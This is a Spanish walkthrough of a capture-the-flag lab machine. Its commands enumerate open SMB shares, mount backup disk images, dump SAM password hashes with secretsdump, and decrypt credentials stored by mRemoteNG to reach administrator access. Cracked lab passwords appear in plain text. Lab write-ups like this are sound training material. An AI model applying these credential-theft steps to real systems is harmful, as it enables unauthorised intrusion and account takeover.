Hacemos el escaneo de nmap:
![[Pasted image 20240129100156.png]]
Si enumerados recursos compartidos con smbclient con una null session, vemos los sigueintes recursos compartidos:
```bash
smbclient -L 10.10.10.134 -N
```
![[Pasted image 20240129100528.png]]
Con smbmap podemos ver qué permisos tenemos sobre estos recursos compartidos, donde vemos que podemos leer y escribir sobre el recurso backups:
```bash
smbmap -H 10.10.10.134 -u 'null'
```
![[Pasted image 20240129100638.png]]
Nos conectamos a este recurso compartido donde vemos un directorio de backups de windows:
```bash
smbclient -N //10.10.10.134/Backups
```
![[Pasted image 20240129100809.png]]
Nos montamos todo este recurso de backups en nuestra máquina atacante de la siguiente forma:
```bash
mount -t cifs -o username=null,password=null //10.10.10.134/Backups /mnt/montura
```
Y ahora podremos navegar por los directorios sin descargarnos nada:
![[Pasted image 20240129101937.png]]
Y esta es la estructura de los directorios:
![[Pasted image 20240129102022.png]]
Y observamos dos archivos con extensión .vhd (archivo de disco virtual):
![[Pasted image 20240129102404.png]]
Y con la utilidad guestmount vamos a montar cada uno de los discos en una nueva carpeta, que crearemos la carpeta discos. Pero con uno de los discos nos da error, aunque con el otro funciona bien:
```bash
guestmount --add /mnt/montura/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro discos/
```
![[Pasted image 20240129104021.png]]
Y dentro del directorio /windows/system32/config, hay un archivo llamado SAM, donde se pueden contener hashes de usuarios, por lo que nos ubicamos en esta ruta y con impacket-secretsdump tratamos de obtenerlos:
![[Pasted image 20240129104319.png]]
Ejecutamos el siguiente comando y obtenemos los hashes:
```bash
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```
![[Pasted image 20240129104346.png]]
Y vemos que la web de crackstation nos encontró el hash del usuario L4mpje:
```bash
L4mpje:bureaulampje
```
![[Pasted image 20240129104534.png]]
Una vez obtenido esto, vamos a entrar por ssh:
```bash
ssh L4mpje@10.10.10.134
```
Y una vez dentro de la máquina, si nos ubicamos dentro de archivos de programa x86, vemos un directorio llamado nRemoteNG, que es extraño:
![[Pasted image 20240129105213.png]]
En este enlace tenemos instrucciones de cómo explotar esto mismo:
```bash
https://ethicalhackingguru.com/how-to-exploit-remote-connection-managers/
```
Dentro de esta web, se nos dice que hay una ruta donde se guardan credenciales en un archivo confCons.xml:
![[Pasted image 20240129105957.png]]
Y confirmamos que ese archivo efectivamente existe en la ruta C:\Users\L4mpje\AppData\Roaming\mRemoteNG:
![[Pasted image 20240129110013.png]]
Pero la contraseña viene encriptada en este archivo, pero sí vemos al principio la línea de protected con la siguiente contraseña
```bash
aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```
![[Pasted image 20240129110052.png]]
Por lo que vamos a pasarnos este archivo en local a nuestra máquina atacante y vamos a tratar de romperlo:
```bash 
scp l4mpje@10.10.10.134:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml .
```
Y lo tenemos en local:
![[Pasted image 20240129110241.png]]
Una vez hecho esto, contamos con el siguiente exploit para romper este archivo y ver credenciales en claro:
```bash
https://github.com/haseebT/mRemoteNG-Decrypt
```
![[Pasted image 20240129110313.png]]
Ejecutamos este exploit siguiendo las instrucciones, pasándole la contraseña protegida y la obtenemos en texto claro:
```bash
python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```
![[Pasted image 20240129110713.png]]
Las credenciales del administrador son las siguientes:
```bash
administrator:thXLHM96BeKL0ER2
```
Entramos por ssh:
```bash
ssh Administrator@10.10.10.134
```
Y ya estamos dentro:
![[Pasted image 20240129110821.png]]
